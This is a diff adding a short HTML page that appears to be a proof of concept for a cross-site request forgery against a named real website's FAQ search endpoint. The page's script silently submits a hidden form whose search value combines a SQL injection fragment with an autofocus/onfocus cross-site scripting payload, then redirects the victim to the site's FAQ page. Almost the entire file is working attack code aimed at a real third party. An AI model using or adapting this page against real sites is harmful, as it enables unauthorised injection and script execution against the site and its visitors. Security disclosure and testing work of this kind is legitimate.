@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Page</title>
+    <script>
+        function handleClick() {
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://fiuu.com/home/updateFAQSearchText/';
+            var input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'searchText';
+            input.value = '%&quot;) ORDER BY 1;-- onfocus=&quot;alert(1)&quot; autofocus=&quot; &quot;%&gt;';
+            form.appendChild(input);
+
+            document.body.appendChild(form);
+            form.submit();
+
+            // After form submission, redirect to another URL
+            window.location.href = 'https://fiuu.com/faq';
+        }
+    </script>
+</head>
+<body>
+    <button onclick="handleClick()">Click Me</button>
+</body>
+</html>
